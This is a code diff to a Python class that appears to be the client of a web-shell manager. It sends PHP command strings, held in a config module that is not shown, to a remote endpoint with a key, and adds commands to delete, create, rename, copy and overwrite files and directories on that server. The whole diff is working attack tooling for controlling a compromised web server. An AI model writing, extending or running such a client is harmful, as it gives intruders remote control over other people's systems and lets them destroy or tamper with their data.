@@ -1,7 +1,6 @@
 import config.fileConfig as fileC
 import requests as res
 class fileManager:
-
     def __init__(self,con):
         self.con = con
 
@@ -33,12 +32,23 @@ class fileManager:
 
     def path(self,re):
         getpath = fileC.PHP_GETPATH
+        getpath = getpath.replace('@@',self.changePath(),1)
         date = { self.key : getpath }
         commit = re.post(self.connect,date)
         # print(commit.text)
         return commit.text
 
+    def changePath(self):
+        j = 0
+        str = self.CHANGE_PATH[0]
+        while j!=self.i:
+            j = j + 1
+            str = str + '/' + self.CHANGE_PATH[j]  
+        return fileC.PHP_CHDIR.replace('##',str,1)
+
     def FileMain(self,re):
+        self.i = 0
+        self.CHANGE_PATH = dict.fromkeys(range(1024),'.')
         while True:
             self.PATH = self.path(re)+" >"
             # print(PATH)
@@ -51,16 +61,20 @@ class fileManager:
                 
             if flag[0] == 'cd':
                 if self.check(flag)>1:
-                    chdir = fileC.PHP_CD.replace('##',flag[1],1)
-                    print(chdir)
-                    date = { self.key : chdir }
+                    self.i = self.i + 1
+                    self.CHANGE_PATH[self.i] = flag[1]
+                    CD = fileC.PHP_CD.replace('@@',self.changePath(),1)
+                    date = { self.key : CD }
                     commit = re.post(self.connect,date)
+                    # print(commit.text)
+                    
                 else:
                     continue
                 
             if flag[0] == 'read':
                 if self.check(flag)>1:
                     READ_r = fileC.PHP_READ.replace('##',flag[1],1)
+                    READ_r = READ_r.replace('@@',self.changePath(),1)
                     # print(READ_r)
                     date = { self.key : READ_r }
                     #date = { self.key : fileC.PHP_test }
@@ -69,18 +83,117 @@ class fileManager:
                 else:
                     continue
 
+            if flag[0] == 'delete' or flag[0] == 'rm':
+                if self.check(flag)>1:
+                    delete = fileC.PHP_DELETE.replace('##',flag[1],1)
+                    delete = delete.replace('@@',self.changePath(),1)
+                    # print(READ_r)
+                    date = { self.key : delete }
+                    #date = { self.key : fileC.PHP_test }
+                    commit = re.post(self.connect,date)
+                    print(commit.text,"\n")
+                else:
+                    continue
+
+            if flag[0] == 'mkdir':
+                if self.check(flag)>1:
+                    mkdir = fileC.PHP_MKDIR.replace('##',flag[1],1)
+                    mkdir = mkdir.replace('@@',self.changePath(),1)
+                    # print(READ_r)
+                    date = { self.key : mkdir }
+                    #date = { self.key : fileC.PHP_test }
+                    commit = re.post(self.connect,date)
+                    print(commit.text,"\n")
+                else:
+                    continue
+
+            if flag[0] == 'rmdir':
+                if self.check(flag)>1:
+                    rmdir = fileC.PHP_RMDIR.replace('##',flag[1],1)
+                    rmdir = rmdir.replace('@@',self.changePath(),1)
+                    # print(READ_r)
+                    date = { self.key : rmdir }
+                    #date = { self.key : fileC.PHP_test }
+                    commit = re.post(self.connect,date)
+                    print(commit.text,"\n")
+                else:
+                    continue
+
+            if flag[0] == 'mkfile':
+                if self.check(flag)>1:
+                    mkfile = fileC.PHP_MKFILE.replace('##',flag[1],1)
+                    mkfile = mkfile.replace('@@',self.changePath(),1)
+                    # print(READ_r)
+                    date = { self.key : mkfile }
+                    #date = { self.key : fileC.PHP_test }
+                    commit = re.post(self.connect,date)
+                    print(commit.text,"\n")
+                else:
+                    continue
+
             if flag[0] == 'ls' or flag[0] == 'dir':
                 dir = fileC.PHP_GETDIR
+                dir = dir.replace('@@',self.changePath(),1)
                 date = { self.key : dir }
                 commit = re.post(self.connect,date)
                 print(commit.text,"\n")
 
             if flag[0] == 'pwd' or flag[0] == 'cwd':
                 pwd = fileC.PHP_GETPATH
+                pwd = pwd.replace('@@',self.changePath(),1)
                 date = { self.key : pwd }
                 commit = re.post(self.connect,date)
                 print(commit.text,"\n")
                 
-                
+            if flag[0] == 'rename':
+                if self.check(flag)>2:
+                    rename = fileC.PHP_RENAME.replace('#1',flag[1],1)
+                    rename = rename.replace("#2",flag[2])
+                    rename = rename.replace('@@',self.changePath(),1)
+                    date = { self.key : rename }
+                    commit = re.post(self.connect,date)
+                    print(commit.text,"\n")
+                else:
+                    continue
+
+            if flag[0] == 'copy':
+                if self.check(flag)>2:
+                    copy = fileC.PHP_COPY.replace('#1',flag[1],1)
+                    copy = copy.replace("#2",flag[2])
+                    copy = copy.replace('@@',self.changePath(),1)
+                    date = { self.key : copy }
+                    commit = re.post(self.connect,date)
+                    print(commit.text,"\n")
+                else:
+                    continue
+
+            if flag[0] == 'write':
+                if self.check(flag)>2:
+                    write = fileC.PHP_WRITE.replace('#1',flag[1],1)
+                    write = write.replace("#2",flag[2])
+                    write = write.replace('@@',self.changePath(),1)
+                    date = { self.key : write }
+                    commit = re.post(self.connect,date)
+                    print(commit.text,"\n")
+                else:
+                    continue
+
+            if flag[0] == 'writeto':
+                if self.check(flag)>2:
+                    writeto = fileC.PHP_WRITETO.replace('#1',flag[1],1)
+                    num = len(flag)
+                    str1 = flag[2]
+                    n = 3
+                    while  n != num:
+                        str1 = str1 + ' ' + flag[n]
+                        n = n + 1
+                    print(str1)
+                    writeto = writeto.replace("#2",str1)
+                    writeto = writeto.replace('@@',self.changePath(),1)
+                    date = { self.key : writeto }
+                    commit = re.post(self.connect,date)
+                    print(commit.text,"\n")
+                else:
+                    continue
 
 
